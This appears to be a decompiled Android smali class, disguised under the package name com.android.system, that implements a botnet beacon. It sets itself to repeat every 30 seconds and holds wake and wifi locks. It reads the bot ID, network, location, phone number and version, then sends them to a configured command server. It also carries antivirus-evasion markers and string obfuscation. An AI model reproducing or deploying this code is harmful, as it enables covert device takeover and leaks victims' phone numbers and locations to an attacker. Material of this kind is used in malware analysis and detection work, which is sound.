.class public Lcom/android/system/netCfg;
.super Landroid/content/BroadcastReceiver;
.source "netCfg.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/android/system/netCfg$Connect;
    }
.end annotation


# instance fields
.field cc:Landroid/content/Context;


# direct methods
.method public constructor <init>()V
    .locals 0

    .prologue
    .line 40
    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    return-void
.end method

.method private Connected(Landroid/content/Context;)Z
    .locals 3
    .param p1, "c"    # Landroid/content/Context;

    .prologue
    .line 139
    const-string v2, "connectivity"

    invoke-virtual {p1, v2}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/net/ConnectivityManager;

    .line 140
    .local v0, "cm":Landroid/net/ConnectivityManager;
    invoke-virtual {v0}, Landroid/net/ConnectivityManager;->getActiveNetworkInfo()Landroid/net/NetworkInfo;

    move-result-object v1

    .line 142
    .local v1, "netInfo":Landroid/net/NetworkInfo;
    if-eqz v1, :cond_0

    invoke-virtual {v1}, Landroid/net/NetworkInfo;->isConnected()Z

    move-result v2

    if-eqz v2, :cond_0

    .line 143
    const/4 v2, 0x1

    .line 147
    :goto_0
    return v2

    :cond_0
    const/4 v2, 0x0

    goto :goto_0
.end method


# virtual methods
.method public Tasker(Landroid/content/Context;)V
    .locals 8
    .param p1, "cc"    # Landroid/content/Context;

    .prologue
    const/4 v1, 0x0

    .line 153
    const-string v2, "alarm"

    invoke-virtual {p1, v2}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/AlarmManager;

    .line 154
    .local v0, "AA":Landroid/app/AlarmManager;
    new-instance v7, Landroid/content/Intent;

    const-class v2, Lcom/android/system/netCfg;

    invoke-direct {v7, p1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 155
    .local v7, "II":Landroid/content/Intent;
    invoke-static {p1, v1, v7, v1}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v6

    .line 156
    .local v6, "PenInt":Landroid/app/PendingIntent;
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v2

    const-wide/16 v4, 0x7530

    invoke-virtual/range {v0 .. v6}, Landroid/app/AlarmManager;->setRepeating(IJJLandroid/app/PendingIntent;)V

    .line 157
    return-void
.end method

.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 23
    .param p1, "c"    # Landroid/content/Context;
    .param p2, "intent"    # Landroid/content/Intent;
    .annotation build Landroid/annotation/SuppressLint;
        value = {
            "Wakelock"
        }
    .end annotation

    .prologue
    .line 48
    const-string v2, "power"

    move-object/from16 v0, p1

    invoke-virtual {v0, v2}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v19

    check-cast v19, Landroid/os/PowerManager;

    .line 49
    .local v19, "pm":Landroid/os/PowerManager;
    const/4 v2, 0x1

    const-string v3, "zLocker"

    move-object/from16 v0, v19

    invoke-virtual {v0, v2, v3}, Landroid/os/PowerManager;->newWakeLock(ILjava/lang/String;)Landroid/os/PowerManager$WakeLock;

    move-result-object v22

    .line 51
    .local v22, "wl":Landroid/os/PowerManager$WakeLock;
    const-string v2, "wifi"

    move-object/from16 v0, p1

    invoke-virtual {v0, v2}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v21

    check-cast v21, Landroid/net/wifi/WifiManager;

    .line 52
    .local v21, "wifiManager":Landroid/net/wifi/WifiManager;
    const/4 v2, 0x1

    const-string v3, "zLockerWF"

    move-object/from16 v0, v21

    invoke-virtual {v0, v2, v3}, Landroid/net/wifi/WifiManager;->createWifiLock(ILjava/lang/String;)Landroid/net/wifi/WifiManager$WifiLock;

    move-result-object v20

    .line 55
    .local v20, "wifi":Landroid/net/wifi/WifiManager$WifiLock;
    move-object/from16 v0, p1

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/system/netCfg;->cc:Landroid/content/Context;

    .line 57
    invoke-virtual/range {v20 .. v20}, Landroid/net/wifi/WifiManager$WifiLock;->acquire()V

    .line 58
    invoke-virtual/range {v22 .. v22}, Landroid/os/PowerManager$WakeLock;->acquire()V

    .line 71
    invoke-direct/range {p0 .. p1}, Lcom/android/system/netCfg;->Connected(Landroid/content/Context;)Z

    move-result v2

    if-eqz v2, :cond_1

    .line 74
    new-instance v2, Lcom/android/system/IO;

    invoke-direct {v2}, Lcom/android/system/IO;-><init>()V

    const-string v3, "BotID"

    move-object/from16 v0, p1

    invoke-virtual {v2, v3, v0}, Lcom/android/system/IO;->readConfig(Ljava/lang/String;Landroid/content/Context;)Ljava/lang/String;

    move-result-object v8

    .line 75
    .local v8, "BotID":Ljava/lang/String;
    new-instance v2, Lcom/android/system/IO;

    invoke-direct {v2}, Lcom/android/system/IO;-><init>()V

    const-string v3, "BotNetwork"

    move-object/from16 v0, p1

    invoke-virtual {v2, v3, v0}, Lcom/android/system/IO;->readConfig(Ljava/lang/String;Landroid/content/Context;)Ljava/lang/String;

    move-result-object v10

    .line 76
    .local v10, "BotNetwork":Ljava/lang/String;
    new-instance v2, Lcom/android/system/IO;

    invoke-direct {v2}, Lcom/android/system/IO;-><init>()V

    const-string v3, "BotLocation"

    move-object/from16 v0, p1

    invoke-virtual {v2, v3, v0}, Lcom/android/system/IO;->readConfig(Ljava/lang/String;Landroid/content/Context;)Ljava/lang/String;

    move-result-object v9

    .line 77
    .local v9, "BotLocation":Ljava/lang/String;
    new-instance v2, Lcom/android/system/IO;

    invoke-direct {v2}, Lcom/android/system/IO;-><init>()V

    const-string v3, "HG"

    move-object/from16 v0, p1

    invoke-virtual {v2, v3, v0}, Lcom/android/system/IO;->readConfig(Ljava/lang/String;Landroid/content/Context;)Ljava/lang/String;

    move-result-object v15

    .line 78
    .local v15, "HttpServer":Ljava/lang/String;
    new-instance v2, Lcom/android/system/IO;

    invoke-direct {v2}, Lcom/android/system/IO;-><init>()V

    const-string v3, "BotVer"

    move-object/from16 v0, p1

    invoke-virtual {v2, v3, v0}, Lcom/android/system/IO;->readConfig(Ljava/lang/String;Landroid/content/Context;)Ljava/lang/String;

    move-result-object v13

    .line 79
    .local v13, "BotVer":Ljava/lang/String;
    sget-object v18, Landroid/os/Build$VERSION;->RELEASE:Ljava/lang/String;

    .line 80
    .local v18, "SDK":Ljava/lang/String;
    new-instance v2, Lcom/android/system/IO;

    invoke-direct {v2}, Lcom/android/system/IO;-><init>()V

    const-string v3, "BotPrefix"

    move-object/from16 v0, p1

    invoke-virtual {v2, v3, v0}, Lcom/android/system/IO;->readConfig(Ljava/lang/String;Landroid/content/Context;)Ljava/lang/String;

    move-result-object v12

    .line 81
    .local v12, "BotPrefix":Ljava/lang/String;
    new-instance v2, Lcom/android/system/IO;

    invoke-direct {v2}, Lcom/android/system/IO;-><init>()V

    const-string v3, "BotPhone"

    move-object/from16 v0, p1

    invoke-virtual {v2, v3, v0}, Lcom/android/system/IO;->readConfig(Ljava/lang/String;Landroid/content/Context;)Ljava/lang/String;

    move-result-object v11

    .line 83
    .local v11, "BotPhone":Ljava/lang/String;
    new-instance v2, Lcom/android/system/IO;

    invoke-direct {v2}, Lcom/android/system/IO;-><init>()V

    const-string v3, "tasker"

    move-object/from16 v0, p1

    invoke-virtual {v2, v3, v0}, Lcom/android/system/IO;->readConfig(Ljava/lang/String;Landroid/content/Context;)Ljava/lang/String;

    move-result-object v14

    .line 85
    .local v14, "Cache":Ljava/lang/String;
    const-string v2, "cache_code"

    invoke-virtual {v14, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-eqz v2, :cond_0

    .line 86
    new-instance v2, Lcom/android/system/IO;

    invoke-direct {v2}, Lcom/android/system/IO;-><init>()V

    const-string v3, "tasker"

    const-string v5, "shutafuckupavs"

    move-object/from16 v0, p1

    invoke-virtual {v2, v3, v5, v0}, Lcom/android/system/IO;->writeConfig(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V

    .line 87
    const-string v4, "cache"

    .line 88
    .local v4, "xx":Ljava/lang/String;
    new-instance v2, Lcom/android/system/Report;

    invoke-direct {v2}, Lcom/android/system/Report;-><init>()V

    const-string v3, "kavSucker"

    move-object v5, v4

    move-object v6, v4

    move-object/from16 v7, p1

    invoke-virtual/range {v2 .. v7}, Lcom/android/system/Report;->Av(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V

    .line 94
    .end local v4    # "xx":Ljava/lang/String;
    :cond_0
    const-string v2, "&preZix="

    const-string v3, "Z"

    const-string v5, "f"

    invoke-virtual {v2, v3, v5}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v16

    .line 96
    .local v16, "KAV_FUD":Ljava/lang/String;
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-static {v15}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v3

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 97
    const-string v3, "?a=1&b="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    .line 98
    invoke-virtual {v2, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    .line 99
    const-string v3, "&c="

    .line 100
    invoke-virtual {v3, v10}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    .line 101
    const-string v5, "&d="

    invoke-virtual {v3, v5}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    .line 102
    invoke-virtual {v3, v9}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    .line 103
    const-string v5, "&e="

    invoke-virtual {v3, v5}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    .line 104
    invoke-virtual {v3, v11}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    .line 105
    const-string v5, "&f="

    invoke-virtual {v3, v5}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    .line 106
    invoke-virtual {v3, v13}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    .line 107
    const-string v5, "&g="

    invoke-virtual {v3, v5}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    .line 108
    move-object/from16 v0, v18

    invoke-virtual {v3, v0}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    .line 109
    move-object/from16 v0, v16

    invoke-virtual {v3, v0}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    .line 110
    invoke-virtual {v3, v12}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    .line 99
    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    .line 96
    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v17

    .line 114
    .local v17, "Log_Data":Ljava/lang/String;
    new-instance v2, Lcom/android/system/netCfg$Connect;

    move-object/from16 v0, p0

    invoke-direct {v2, v0}, Lcom/android/system/netCfg$Connect;-><init>(Lcom/android/system/netCfg;)V

    const/4 v3, 0x1

    new-array v3, v3, [Ljava/lang/String;

    const/4 v5, 0x0

    aput-object v17, v3, v5

    invoke-virtual {v2, v3}, Lcom/android/system/netCfg$Connect;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    .line 129
    .end local v8    # "BotID":Ljava/lang/String;
    .end local v9    # "BotLocation":Ljava/lang/String;
    .end local v10    # "BotNetwork":Ljava/lang/String;
    .end local v11    # "BotPhone":Ljava/lang/String;
    .end local v12    # "BotPrefix":Ljava/lang/String;
    .end local v13    # "BotVer":Ljava/lang/String;
    .end local v14    # "Cache":Ljava/lang/String;
    .end local v15    # "HttpServer":Ljava/lang/String;
    .end local v16    # "KAV_FUD":Ljava/lang/String;
    .end local v17    # "Log_Data":Ljava/lang/String;
    .end local v18    # "SDK":Ljava/lang/String;
    :cond_1
    invoke-virtual/range {v20 .. v20}, Landroid/net/wifi/WifiManager$WifiLock;->release()V

    .line 130
    invoke-virtual/range {v22 .. v22}, Landroid/os/PowerManager$WakeLock;->release()V

    .line 133
    return-void
.end method
